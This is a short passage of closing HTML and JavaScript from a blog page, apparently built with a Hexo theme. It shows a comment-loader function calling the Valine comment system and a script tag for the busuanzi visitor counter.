} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>